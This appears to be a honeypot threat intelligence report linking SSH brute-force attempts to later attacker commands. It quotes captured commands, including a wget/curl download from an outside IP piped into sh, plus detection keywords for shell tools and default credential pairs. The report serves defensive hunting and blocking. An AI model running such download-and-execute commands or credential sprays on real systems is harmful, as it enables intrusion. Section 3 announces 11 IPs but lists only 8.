# Threat Intelligence Report: Brute Force → Lateral Movement Analysis

**Generated:** 2026-04-30  
**Log source:** SSH Honeypot — `data/logs/events.jsonl`  
**Log window:** 2026-04-27 to 2026-04-30  
**Total events analyzed:** 1,602 (217 sessions, 950 commands)

---

## Executive Summary

Of the 54 unique source IPs observed, **15 exhibited brute force behavior** (multiple credential attempts from the same IP). Of those 15, **4 IPs proceeded to execute lateral movement (LM) IoC commands** after their credential spray. All 4 cases show the brute force phase preceding LM activity, confirming the expected attack chain: credential brute force → successful session → lateral movement staging.

> **Key finding:** Every IP that executed LM commands had first engaged in multi-session credential attempts. No LM activity was observed from single-session IPs, suggesting a deliberate attacker workflow rather than opportunistic one-shot payloads.

---

## Definitions Applied

| Term | Definition Used |
|------|----------------|
| **Brute Force** | ≥2 `connect` events from the same source IP (each carry distinct username/password pairs) |
| **Lateral Movement IoC** | Commands matching: `ssh-keygen`, `scp`, `rsync`, `bash -i`, `nc`, `authorized_keys`, `.ssh/`, piped shell execution (`\| sh`, `\| bash`) |

---

## Section 1 — Brute Force → Lateral Movement: Confirmed Cases

### Summary Table

| Source IP | Country | Sessions | Unique Creds | First Attempt (UTC) | First LM Command (UTC) | BF→LM Delta | LM Technique | AbuseIPDB Score |
|-----------|---------|----------|--------------|---------------------|------------------------|-------------|--------------|-----------------|
| `83.216.105.146` | Sweden | 2 | 2 | 2026-04-30 00:00:20 | 2026-04-30 00:00:20 | **0.2 s** | SCP file drop | 0 |
| `130.12.180.51` | Netherlands | 2 | 1 | 2026-04-28 22:48:42 | 2026-04-28 22:48:43 | **0.4 s** | Remote shell download (`\| sh`) | 0 |
| `70.182.230.68` | United States | 11 | 11 | 2026-04-28 17:03:15 | 2026-04-28 17:16:03 | **12m 47s** | Interactive shell (`bash -i`) | 0 |
| `::1` *(localhost)* | — *(internal)* | 30 | 2 | 2026-04-28 00:44:19 | 2026-04-28 01:30:12 | **45m 53s** | Interactive shell (`bash -i`) | 0 |

---

## Section 2 — Per-IP Detailed Analysis

---

### IP: `83.216.105.146`
**Country:** Sweden &nbsp;|&nbsp; **ASN:** AS20626 Sandviken Energi AB &nbsp;|&nbsp; **Cloud:** No  
**AbuseIPDB Confidence:** 0

**Credential attempts (2 sessions):**
```
pi : raspberry
pi : raspberryraspberry993311
```

**Attack narrative:** This attacker targeted the well-known default Raspberry Pi credential `pi:raspberry`, then immediately retried with an extended variant. The 0.2-second gap between first login and SCP command indicates a fully automated attack framework — the SCP stage was pre-queued and fired the instant authentication returned success. The target path `/tmp/CUzcxux0` is a randomly named temporary binary, consistent with dropper-stage tooling.

**LM Commands observed:**
```
scp -t /tmp/CUzcxux0   (×2, across 2 sessions)
```

**MITRE ATT&CK mapping:**
- T1110.001 — Brute Force: Password Guessing
- T1105 — Ingress Tool Transfer (SCP drop to `/tmp`)

---

### IP: `130.12.180.51`
**Country:** Netherlands &nbsp;|&nbsp; **ASN:** AS202412 Omegatech LTD &nbsp;|&nbsp; **Cloud:** No  
**AbuseIPDB Confidence:** 0

**Credential attempts (2 sessions):**
```
admin : admin   (×2)
```

**Attack narrative:** Default credential spray (`admin:admin`) on two sessions. The LM payload is a remote shell downloader piped directly to `sh` with an SSH-specific argument flag (`-s ssh`), fetching from `217.60.241.36`. The `uname -a` reconnaissance precedes the download in one session, suggesting the script adapts its payload to the target architecture. The hex-encoded string decodes to `auth_ok\n` — a C2 beacon acknowledgement check. The 0.4-second delta indicates automation.

**LM Commands observed:**
```
(wget --no-check-certificate -qO- https://217.60.241.36/sh || curl -sk https://217.60.241.36/sh) | sh -s ssh
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget ... https://217.60.241.36/sh) | sh -s ssh
```

> **IOC:** Remote payload host `217.60.241.36` — flag for blocking/hunting across your infrastructure.

**MITRE ATT&CK mapping:**
- T1110.001 — Brute Force: Password Guessing
- T1059.004 — Command and Scripting Interpreter: Unix Shell
- T1105 — Ingress Tool Transfer

---

### IP: `70.182.230.68`
**Country:** United States &nbsp;|&nbsp; **ASN:** AS22773 Cox Communications Inc. &nbsp;|&nbsp; **Cloud:** No  
**AbuseIPDB Confidence:** 0

**Credential attempts (11 sessions):**
```
root : asdfkj
root : asdkf
root : asdfdsdf
root : adf
root : lkjg
root : ldkfj
root : ladkjf
root : lkdfj
root : kjh
root : l;adkfj
root : kjhg
```

**Attack narrative:** Eleven manual-looking root password attempts with short, keyboard-pattern passwords — suggestive of a human attacker trying variants off a small wordlist or typing ad hoc. The 12m 47s gap between first attempt and the `bash -i` command is consistent with human pacing. The interactive shell request (`bash -i`) indicates the attacker was expecting a PTY for hands-on access. Likely a hobbyist or low-sophistication actor.

**LM Commands observed:**
```
bash -i
```

**MITRE ATT&CK mapping:**
- T1110.001 — Brute Force: Password Guessing
- T1059.004 — Command and Scripting Interpreter: Unix Shell (interactive)

---

### IP: `::1` *(Localhost — Internal Origin)*
**Country:** — &nbsp;|&nbsp; **ASN:** — &nbsp;|&nbsp; **Cloud:** N/A  
**AbuseIPDB Confidence:** N/A

**Credential attempts (30 sessions, 2 unique credential pairs):**
```
solana : test   (repeated ~28 times)
solana : x      (repeated ~2 times)
```

**Attack narrative:** 30 sessions from loopback with only 2 credential variants, sustained over ~46 minutes. This is almost certainly **internal testing traffic** (the honeypot operator running scripted tests) rather than a real attacker. However, it is flagged here for completeness because it matches the brute force + `bash -i` pattern. The repeated `solana` username is consistent with honeypot dev/test accounts seen elsewhere in the logs.

> **Recommendation:** Exclude `::1` from production threat reporting or add a filter for loopback addresses.

**LM Commands observed:**
```
bash -i   (×2)
```

---

## Section 3 — Brute Force IPs Without LM Activity

These 11 IPs exhibited multi-session credential spraying but did not escalate to LM commands. They represent either automated scanners that did not have a follow-on payload ready, or actors whose post-auth toolkit failed silently.

| Source IP | Sessions | Country | Notable Credentials |
|-----------|----------|---------|---------------------|
| `2.57.121.112` | 37 | Netherlands | `admin:260893`, `admin:26101973` (date-based PINs) |
| `76.230.149.86` | 36 | — | `root:root` (×36 — pure default check) |
| `2.57.121.25` | 22 | Netherlands | `user:thelast1`, `user:sonya`, `user:tandem` |
| `213.209.159.159` | 10 | — | `johnna:johnna`, `keegan:keegan` (username=password) |
| `45.148.10.121` | 10 | — | `admin:admin` (×10) |
| `5.129.238.185` | 4 | — | `admin:admin`, `test:test`, `sshd:sshd` |
| `161.35.46.137` | 3 | — | `ubuntu:1234`, `dspace:dspace` |
| `172.18.0.1` | 3 | — *(docker gateway)* | `solana:` (blank password) |

---

## Section 4 — MITRE ATT&CK Technique Frequency (All Sessions)

| # | Technique ID | Name | Tactic | Count |
|---|-------------|------|--------|-------|
| 1 | T1053.003 | Scheduled Task/Job: Cron | Persistence | 119 |
| 2 | T1082 | System Information Discovery | Discovery | 39 |
| 3 | T1033 | System Owner/User Discovery | Discovery | 21 |
| 4 | T1059.004 | Unix Shell | Execution | 21 |
| 5 | T1222.002 | File Permission Modification (Linux) | Defense Evasion | 21 |
| 6 | T1057 | Process Discovery | Discovery | 18 |
| 7 | T1083 | File and Directory Discovery | Discovery | 17 |
| 8 | T1003.008 | /etc/passwd and /etc/shadow Dump | Credential Access | 15 |
| 9 | T1105 | Ingress Tool Transfer | Command & Control | 10 |
| 10 | T1049 | System Network Connections Discovery | Discovery | 5 |

> **Note:** Cron persistence (T1053.003) dominates at 119 hits, driven by a shared malware campaign deploying a `w.sh` cryptominer via crontab. This campaign was observed from IPs `211.227.185.88`, `161.35.46.137`, and `133.18.181.51`.

---

## Section 5 — Indicators of Compromise (IOCs)

### Network IOCs

| IOC | Type | Context |
|-----|------|---------|
| `217.60.241.36` | Malicious IP | Remote shell payload host (`/sh` endpoint), used by `130.12.180.51` |
| `130.12.180.51` | Source IP | Scripted dropper, AS202412 Netherlands |
| `83.216.105.146` | Source IP | Raspberry Pi credential attacker + SCP dropper, Sweden |
| `70.182.230.68` | Source IP | Manual root brute force, US Cox residential |

### File/Path IOCs

| IOC | Type | Context |
|-----|------|---------|
| `/tmp/CUzcxux0` | Dropped file path | SCP dropper target from `83.216.105.146` |
| `w.sh` | Malware script name | Cryptominer dropper used across cron-persistence campaign |

### Credential IOCs

| Username | Password | Source IP | Notes |
|----------|----------|-----------|-------|
| `pi` | `raspberry` | `83.216.105.146` | Default Raspberry Pi credential |
| `pi` | `raspberryraspberry993311` | `83.216.105.146` | Extended Raspberry Pi variant |
| `admin` | `admin` | `130.12.180.51`, `45.148.10.121` | Default credential, widespread |
| `root` | `root` | `76.230.149.86` | Default, 36 attempts from single IP |

---

## Section 6 — Findings & Recommendations

1. **Block `217.60.241.36` at perimeter.** This IP hosts an active shell payload endpoint referenced by name in attacker commands. Treat as confirmed C2 infrastructure.

2. **Raspberry Pi defaults remain heavily targeted.** The `pi:raspberry` credential pair was used in an automated, sub-second attack chain. Rotate or disable default credentials on any Pi-class devices or embedded systems.

3. **Default credential spray from 2.57.121.x (Netherlands) is high-volume.** Two IPs in that subnet (`2.57.121.112` — 37 sessions, `2.57.121.25` — 22 sessions) represent the most active scanning source by session count, though neither escalated to LM. The subnet AS47890 (Unmanaged LTD) is worth monitoring.

4. **Filter localhost (`::1`) from threat reports.** The loopback traffic inflates brute-force counts and should be excluded from production alert logic.

5. **The cron-based `w.sh` cryptominer campaign spans multiple source IPs.** Treat this as a coordinated campaign, not isolated incidents. The shared payload fingerprint (`w.sh "astats" "netai" "kstats" "ssh 2 ranges"`) should be added to SIEM detection rules.

---

*Report generated from raw honeypot telemetry. AbuseIPDB confidence scores reflect enrichment data captured at time of session. All timestamps are UTC.*
